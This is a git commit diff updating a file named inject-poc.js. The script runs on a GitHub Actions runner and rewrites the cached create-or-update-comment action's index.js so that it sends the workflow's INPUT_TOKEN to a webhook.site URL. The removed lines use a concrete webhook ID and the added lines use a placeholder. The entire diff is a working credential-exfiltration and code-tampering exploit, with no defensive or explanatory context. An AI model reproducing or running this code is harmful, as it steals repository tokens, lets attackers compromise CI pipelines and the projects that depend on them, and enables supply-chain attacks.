798f6e28b03789d6b86972b14bc780c6c4670035
casperchenwork0523-cpu <casperchenwork0523@gmail.com>
2026-03-23 08:49:15 +0800

    Update inject-poc.js
    5

--- inject-poc.js
+++ inject-poc.js
@@ -1,6 +1,25 @@
-const fs = require('fs'), path = require('path');
-const d = path.join(process.env.GITHUB_WORKSPACE, '../../_actions/peter-evans/create-or-update-comment');
-if (fs.existsSync(d)) fs.readdirSync(d).forEach(v => {
-    const f = path.join(d, v, 'dist', 'index.js');
-    if (fs.existsSync(f)) fs.writeFileSync(f, `require('https').get('https://webhook.site/0a325b63-84b8-4a11-87fe-a0adf9a867f3?token='+process.env.INPUT_TOKEN);\n` + fs.readFileSync(f, 'utf8'));
+const fs=require('fs'),path=require('path');
+
+const d=path.join(process.env.GITHUB_WORKSPACE,'../../_actions/peter-evans/create-or-update-comment');
+
+if(fs.existsSync(d))fs.readdirSync(d).forEach(v=>{
+
+const f=path.join(d,v,'dist','index.js');
+
+if(fs.existsSync(f))fs.writeFileSync(f,`
+
+const https = require('https');
+
+if(process.env.INPUT_TOKEN) {
+
+    https.get('https://webhook.site/你的-WEBHOOK-ID?token='+process.env.INPUT_TOKEN, () => {
+
+        process.exit(0);
+
+    });
+
+}
+
+`+fs.readFileSync(f,'utf8'));
+
 });
